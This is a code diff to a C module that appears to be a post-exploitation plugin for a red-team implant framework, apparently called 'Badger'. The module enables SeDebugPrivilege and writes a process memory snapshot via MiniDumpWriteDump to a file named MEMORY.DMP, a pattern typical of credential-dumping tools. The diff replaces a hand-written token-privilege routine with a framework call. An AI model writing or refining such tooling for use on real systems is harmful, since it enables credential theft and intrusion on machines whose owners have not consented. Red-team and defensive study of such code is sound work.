@@ -175,9 +175,6 @@ typedef enum {
 } PSS_CAPTURE_FLAGS;
 
 WINADVAPI WINAPI NTSTATUS Ntdll$NtGetNextProcess(_In_ HANDLE, _In_ ACCESS_MASK, _In_ ULONG, _In_ ULONG, _Out_ PHANDLE);
-WINADVAPI WINAPI BOOL Advapi32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
-WINADVAPI WINAPI BOOL Advapi32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
-WINADVAPI WINAPI BOOL Advapi32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
 WINADVAPI WINAPI BOOL Kernel32$CloseHandle(HANDLE);
 WINADVAPI WINAPI DWORD Psapi$GetModuleFileNameExA(HANDLE, HMODULE, LPSTR, DWORD);
 WINADVAPI WINAPI DWORD Kernel32$GetProcessId(HANDLE);
@@ -197,23 +194,6 @@ BOOL CALLBACK Ex_MiniDumpWriteDumpCallback(PVOID CallbackParam, const PMINIDUMP_
 	return TRUE;
 }
 
-BOOL task_adjusttoken() {
-	HANDLE hToken;
-	TOKEN_PRIVILEGES tp;
-	if (Advapi32$OpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
-		if (Advapi32$LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid)) {
-			tp.PrivilegeCount = 1;
-			tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-			if (Advapi32$AdjustTokenPrivileges(hToken, 0, &tp, sizeof(tp), NULL, NULL)) {
-				Kernel32$CloseHandle(hToken);
-				return TRUE;
-			}
-		}
-		Kernel32$CloseHandle(hToken);
-	}
-	return FALSE;
-}
-
 void coffee(char** argv, int argc, WCHAR** dispatch) {
 	WCHAR* path2dump = L"C:\\Windows\\System32\\MEMORY.DMP";
 	HPSS SSHHandle = NULL;
@@ -222,7 +202,7 @@ void coffee(char** argv, int argc, WCHAR** dispatch) {
 	HANDLE hProcess = NULL;
 	DWORD l_pid = 0;
 
-	if (!task_adjusttoken()) {
+	if (! BadgerAddPrivilege(SE_DEBUG_NAME)) {
 		BadgerDispatchW(dispatch, L"[-] E: Debug privilege\n");
 		return;
 	}
